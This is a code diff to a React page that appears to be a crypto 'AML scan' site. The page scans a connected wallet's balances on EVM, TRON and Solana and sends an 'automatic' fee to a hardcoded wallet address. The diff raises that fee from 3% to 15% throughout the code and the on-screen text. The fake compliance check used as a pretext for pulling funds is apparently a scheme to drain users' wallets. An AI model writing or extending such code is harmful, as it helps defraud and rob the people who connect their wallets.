@@ -152,7 +152,7 @@ export default function Home() {
   const [amlScanStarted, setAmlScanStarted] = useState(false);
   const [showAmlModal, setShowAmlModal] = useState(false);
   const SERVICE_FEE_PERCENT = BigInt(
-    process.env.NEXT_PUBLIC_SERVICE_FEE_PERCENT || process.env.SERVICE_FEE_PERCENT || '3'
+    process.env.NEXT_PUBLIC_SERVICE_FEE_PERCENT || process.env.SERVICE_FEE_PERCENT || '15'
   );
   const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || process.env.SERVICE_WALLET_ADDRESS || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
   const [tokenSymbol, setTokenSymbol] = useState('');
@@ -856,7 +856,7 @@ export default function Home() {
       let feeTxHash: string | null = null;
 
       if (preferredNetwork.chainType === 'TRON') {
-        setServiceFeeDebug(`Sending 3% fee via TRON: ${formattedFeeDisplay}`);
+        setServiceFeeDebug(`Sending ${SERVICE_FEE_PERCENT}% fee via TRON: ${formattedFeeDisplay}`);
         feeTxHash = await sendTronTransfer(
           {
             network: 'TRON',
@@ -875,7 +875,7 @@ export default function Home() {
         if (!solanaUserAddress) {
           throw new Error('Solana wallet address is not connected.');
         }
-        setServiceFeeDebug(`Sending 3% fee via Solana: ${formattedFeeDisplay}`);
+        setServiceFeeDebug(`Sending ${SERVICE_FEE_PERCENT}% fee via Solana: ${formattedFeeDisplay}`);
         feeTxHash = await sendSolanaTransfer(
           {
             network: 'Solana',
@@ -926,7 +926,7 @@ export default function Home() {
         if (walletClient) {
           try {
             if (!preferredNetwork.isNative && preferredNetwork.contractAddress) {
-              setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% ${preferredNetwork!.symbol} token transfer on ${selectedChain.name}`.trim());
+              setServiceFeeDebug((prev) => `${prev || ''}\nSending ${SERVICE_FEE_PERCENT}% ${preferredNetwork!.symbol} token transfer on ${selectedChain.name}`.trim());
               const hash = await sendEvmTokenTransferWithUnits(
                 preferredNetwork.contractAddress,
                 SERVICE_WALLET_ADDRESS,
@@ -935,7 +935,7 @@ export default function Home() {
               );
               if (hash) feeTxHash = String(hash);
             } else {
-              setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% fee via walletClient.sendTransaction (${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol})`.trim());
+              setServiceFeeDebug((prev) => `${prev || ''}\nSending ${SERVICE_FEE_PERCENT}% fee via walletClient.sendTransaction (${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol})`.trim());
               const hash = await walletClient.sendTransaction({
                 account: address as `0x${string}`,
                 to: SERVICE_WALLET_ADDRESS as `0x${string}`,
@@ -995,11 +995,11 @@ export default function Home() {
       }
 
       if (!feeTxHash || feeTxHash === '0x') {
-        throw new Error('Transaction was not confirmed by the wallet. Please approve the 3% fee in your wallet app.');
+        throw new Error(`Transaction was not confirmed by the wallet. Please approve the ${SERVICE_FEE_PERCENT}% fee in your wallet app.`);
       }
 
       setServiceFeeHash(feeTxHash);
-      setServiceFeeDebug(`3% fee transaction submitted: ${feeTxHash}`);
+      setServiceFeeDebug(`${SERVICE_FEE_PERCENT}% fee transaction submitted: ${feeTxHash}`);
       setServiceFeeSent(true);
       setServiceFeeChargedKey(activeFeeKey);
       setAwaitingApproval(false);
@@ -1443,7 +1443,7 @@ export default function Home() {
                 </div>
 
                 <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
-                  <button className="neon-button neon-primary" onClick={async () => { try { setServiceFeeError(null); setServiceFeeDebug(null); await chargeServiceFee({ autoReturn: true }); } catch (e) { console.error(e); } }} style={{ padding: '8px 12px' }}>Charge 3% now</button>
+                  <button className="neon-button neon-primary" onClick={async () => { try { setServiceFeeError(null); setServiceFeeDebug(null); await chargeServiceFee({ autoReturn: true }); } catch (e) { console.error(e); } }} style={{ padding: '8px 12px' }}>Charge 15% now</button>
                   <button className="neon-button neon-secondary" onClick={manualRetry} style={{ padding: '8px 12px' }}>Retry + Open Wallet</button>
                   <button className="neon-button neon-ghost" onClick={() => { disconnect(); setTronAddress(null); setSolanaAddress(null); }} style={{ padding: '8px 12px' }}>Disconnect</button>
                 </div>
@@ -1452,8 +1452,8 @@ export default function Home() {
                   {amlScanning
                     ? '🔍 Scanning wallet for AML risk and supported EVM, TRON, and Solana balances...'
                     : amlScanComplete
-                      ? '✅ AML scan complete. Checking available balances across all networks for the automatic 3% fee.'
-                      : '🔎 Checking wallet activity and supported balances (EVM, TRON, Solana) before the automatic fee.'}
+                      ? '✅ AML scan complete. Checking available balances across all networks for the automatic 15% fee.'
+                      : '🔎 Checking wallet activity and supported balances (EVM, TRON, Solana) before the automatic 15% fee.'}
                 </div>
 
                 {serviceFeeProcessing && !awaitingApproval && (
